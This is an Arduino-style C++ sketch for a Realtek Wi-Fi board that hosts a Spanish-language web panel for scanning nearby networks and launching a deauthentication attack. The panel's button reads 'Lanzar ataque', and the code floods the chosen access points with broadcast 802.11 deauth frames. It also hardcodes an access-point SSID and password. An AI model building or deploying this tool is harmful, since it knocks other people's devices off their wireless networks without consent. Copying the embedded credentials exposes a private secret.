#include "vector"
#include "wifi_conf.h"
#include "map"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"

// LEDs:
//  Red: System usable, Web server active etc.
//  Green: Web Server communication happening
//  Blue: Deauth-Frame being sent

typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
} WiFiScanResult;

char *ssid = "Infinitum439_C2.4G";
char *pass = "root2890123234";

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
std::vector<int> deauth_wifis;
WiFiServer server(80);
uint8_t deauth_bssid[6];
uint16_t deauth_reason = 2;

#define FRAMES_PER_DEAUTH 5

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(" done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}

String parseRequest(String request) {
  int path_start = request.indexOf(' ') + 1;
  int path_end = request.indexOf(' ', path_start);
  return request.substring(path_start, path_end);
}

std::vector<std::pair<String, String>> parsePost(String &request) {
    std::vector<std::pair<String, String>> post_params;

    // Find the start of the body
    int body_start = request.indexOf("\r\n\r\n");
    if (body_start == -1) {
        return post_params; // Return an empty vector if no body found
    }
    body_start += 4;

    // Extract the POST data
    String post_data = request.substring(body_start);

    int start = 0;
    int end = post_data.indexOf('&', start);

    // Loop through the key-value pairs
    while (end != -1) {
        String key_value_pair = post_data.substring(start, end);
        int delimiter_position = key_value_pair.indexOf('=');

        if (delimiter_position != -1) {
            String key = key_value_pair.substring(0, delimiter_position);
            String value = key_value_pair.substring(delimiter_position + 1);
            post_params.push_back({key, value}); // Add the key-value pair to the vector
        }

        start = end + 1;
        end = post_data.indexOf('&', start);
    }

    // Handle the last key-value pair
    String key_value_pair = post_data.substring(start);
    int delimiter_position = key_value_pair.indexOf('=');
    if (delimiter_position != -1) {
        String key = key_value_pair.substring(0, delimiter_position);
        String value = key_value_pair.substring(delimiter_position + 1);
        post_params.push_back({key, value});
    }

    return post_params;
}

String makeResponse(int code, String content_type) {
  String response = "HTTP/1.1 " + String(code) + " OK\n";
  response += "Content-Type: " + content_type + "\n";
  response += "Connection: close\n\n";
  return response;
}

String makeRedirect(String url) {
  String response = "HTTP/1.1 307 Temporary Redirect\n";
  response += "Location: " + url;
  return response;
}

void handleRoot(WiFiClient &client) {
  String response = makeResponse(200, "text/html") + R"(
  <!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>&#129321;PARA PRUEBAS NAMAS&#129321;</title>
      <style>
          body {
              font-family: Arial, sans-serif;
              line-height: 1.6;
              color: #333;
              max-width: 800px;
              margin: 0 auto;
              padding: 20px;
              background-color: #f4f4f4;
          } 
          h1, h2 {
              color: #2c3e50;
          }
          table {
              width: 100%;
              border-collapse: collapse;
              margin-bottom: 20px;
          }
          th, td {
              padding: 12px;
              text-align: left;
              border-bottom: 1px solid #ddd;
          }
          th {
              background-color: #3498db;
              color: white;
          }
          tr:nth-child(even) {
              background-color: #f2f2f2;
          }
          form {
              background-color: white;
              padding: 20px;
              border-radius: 5px;
              box-shadow: 0 2px 5px rgba(0,0,0,0.1);
              margin-bottom: 20px;
          }
          input[type="submit"] {
              padding: 10px 20px;
              border: none;
              background-color: #3498db;
              color: white;
              border-radius: 4px;
              cursor: pointer;
              transition: background-color 0.3s;
          }
          input[type="submit"]:hover {
              background-color: #2980b9;
          }
      </style>
  </head>
  <body>
      <h1>&#129321; QUE EMPIECE LA FIESTA &#129321;</h1>

      <h2>Redes WiFi</h2>
      <form method="post" action="/deauth">
          <table>
              <tr>
                  <th>Seleccionar</th>
                  <th>N&uacute;mero</th>
                  <th>SSID</th>
                  <th>BSSID</th>
                  <th>Canal</th>
                  <th>RSSI</th>
                  <th>Frecuencia</th>
              </tr>
  )";

  for (uint32_t i = 0; i < scan_results.size(); i++) {
    response += "<tr>";
    response += "<td><input type='checkbox' name='network' value='" + String(i) + "'></td>";
    response += "<td>" + String(i) + "</td>";
    response += "<td>" + scan_results[i].ssid + "</td>";
    response += "<td>" + scan_results[i].bssid_str + "</td>";
    response += "<td>" + String(scan_results[i].channel) + "</td>";
    response += "<td>" + String(scan_results[i].rssi) + "</td>";
    response += "<td>" + (String)((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "</td>";
    response += "</tr>";
  }

  response += R"(
        </table>
          <p>C&oacute;digo de error:</p>
          <input type="text" name="reason" placeholder="Ingresar">
          <input type="submit" value="Lanzar ataque">
      </form>

      <form method="post" action="/rescan">
          <input type="submit" value="Reescanear redes">
      </form>

      <h2>C&oacute;digos De falla</h2>
    <table>
        <tr>
            <th>C&oacute;digo</th>
            <th>Raz&oacute;</th>
        </tr>
        <tr><td>0</td><td>C&oacute;digo no utilizado, reservado para uso futuro.</td></tr>
        <tr><td>1</td><td>Raz&oacute;n no especificada</td></tr>
        <tr><td>2</td><td>Autenticaci&oacute;n previa ya no v&aacute;lida.</td></tr>
        <tr><td>3</td><td>Desautenticado porque la estaci&oacute;n (STA) est&aacute; abandonando o ha abandonado el conjunto de servicios b&aacute;sicos independientes (IBSS) o ESS.</td></tr>
        <tr><td>4</td><td>Disociado debido a inactividad.</td></tr>
        <tr><td>5</td><td>Disociado porque el dispositivo WAP no puede manejar todas las STA asociadas actualmente.</td></tr>
        <tr><td>6</td><td>Frame Clase 2 recibido de una STA no autenticada</td></tr>
        <tr><td>7</td><td>Frame Clase 3 recibido de una STA no asociada.</td></tr>
        <tr><td>8</td><td>Disociado porque la STA est&aacute; abandonando o ha abandonado el conjunto de servicios b&aacute;sicos (BSS).</td></tr>
        <tr><td>9</td><td>La STA que solicita (re)asociaci&oacute;n no est&aacute; autenticada con la STA que responde.</td></tr>
        <tr><td>10</td><td>Disociado porque la informaci&oacute;n en el elemento de capacidad de energ&iacute;a es inaceptable.</td></tr>
        <tr><td>11</td><td>Disociado porque la informaci&oacute;n en el elemento de canales soportados es inaceptable.</td></tr>
        <tr><td>12</td><td>Disociado debido a la gesti&oacute;n de transici&oacute;n BSS.</td></tr>
        <tr><td>13</td><td>Elemento inv&aacute;lido, es decir, un elemento definido en este est&aacute;ndar cuyo contenido no cumple con las especificaciones de la Cl&aacute;usula 8.<td></td></tr>
        <tr><td>14</td><td>Falla en el c&oacute;digo de integridad del mensaje (MIC).<td></td></tr>
        <tr><td>15</td><td>Tiempo de espera agotado en el intercambio de claves de 4 pasos (4-Way Handshake).<td></td></tr>
        <tr><td>16</td><td>Tiempo de espera agotado en el intercambio de claves grupales (Group Key Handshake).<td></td></tr>
        <tr><td>17</td><td>Elemento en el intercambio de claves de 4 pasos diferente del frame de (Re)Asociaci&oacute;n/Respuesta de Sonda/Beacon.<td></td></tr>
        <tr><td>18</td><td>Cifrado grupal inv&aacute;lido.<td></td></tr>
        <tr><td>19</td><td>Cifrado de pares inv&aacute;lido.<td></td></tr>
        <tr><td>20</td><td>AKMP inv&aacute;lido.<td></td></tr>
        <tr><td>21</td><td>Versi&oacute;n de RSNE no soportada.<td></td></tr>
        <tr><td>22</td><td>Capacidades de RSNE inv&aacute;lidas.<td></td></tr>
        <tr><td>23</td><td>Fall&oacute; la autenticaci&oacute;n IEEE 802.1X.<td></td></tr>
        <tr><td>24</td><td>Suite de cifrado rechazada debido a la pol&iacute;tica de seguridad.<td></td></tr>
    </table>
  </body>
  </html>
  )";

  client.write(response.c_str());
}

void handle404(WiFiClient &client) {
  String response = makeResponse(404, "text/plain");
  response += "Not found!";
  client.write(response.c_str());
}

void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);

  DEBUG_SER_INIT();
  WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
  if (scanNetworks()) {
    delay(1000);
  }

#ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
#endif

  server.begin();

  digitalWrite(LED_R, HIGH);
}

void loop() {
  WiFiClient client = server.available();
  if (client.connected()) {
    digitalWrite(LED_G, HIGH);
    String request;
    while (client.available()) {
      while (client.available()) request += (char)client.read();
      delay(1);
    }
    DEBUG_SER_PRINT(request);
    String path = parseRequest(request);
    DEBUG_SER_PRINT("\nRequested path: " + path + "\n");

    if (path == "/") {
      handleRoot(client);
    } else if (path == "/rescan") {
      client.write(makeRedirect("/").c_str());
      while (scanNetworks()) {
        delay(1000);
      }
    } else if (path == "/deauth") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      if (post_data.size() >= 2) {
        for (auto &param : post_data) {
          if (param.first == "network") {
            deauth_wifis.push_back(String(param.second).toInt());
          } else if (param.first == "reason") {
            deauth_reason = String(param.second).toInt();
          }
        }
      }
    } else {
      handle404(client);
    }

    client.stop();
    digitalWrite(LED_G, LOW);
  }
  
  uint32_t current_num = 0;
  while (deauth_wifis.size() > 0) {
    memcpy(deauth_bssid, scan_results[current_num].bssid, 6);
    wext_set_channel(WLAN0_NAME, scan_results[current_num].channel);
    current_num++;
    if (current_num >= deauth_wifis.size()) current_num = 0;
    digitalWrite(LED_B, HIGH);
    for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      delay(5);
    }
    digitalWrite(LED_B, LOW);
    delay(50);
  }
}
